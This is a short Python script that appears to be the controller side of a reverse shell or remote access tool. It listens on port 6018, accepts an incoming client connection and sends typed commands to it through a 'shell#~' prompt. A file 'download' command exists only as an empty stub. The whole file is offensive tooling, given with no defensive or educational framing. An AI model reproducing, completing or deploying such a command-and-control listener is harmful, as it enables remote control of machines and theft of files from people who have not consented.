import socket, base64
from termcolor import colored
from socket_handlers import *


def run_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(colored("[+] Server Socket Created.", "blue"))
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(colored("[+] Server Is Listening...", "blue"))
    client_socket, client_address = server_socket.accept()
    print(colored(f"[+] Connected To {str(client_address)} Client", "green"))

    while True:
        command = input(colored("shell#~", "light_yellow"))
        if command.rstrip() == "":
            continue
        socket_send(client_socket, command)
        # * Exit Command
        if command == "exit":
            break
        # * cd Command
        if command[:2] == "cd":
            continue
        elif command[:8] == "download":
            pass
        
        
        


if "__main__" == __name__:
    run_server(host="0.0.0.0", port=6018)
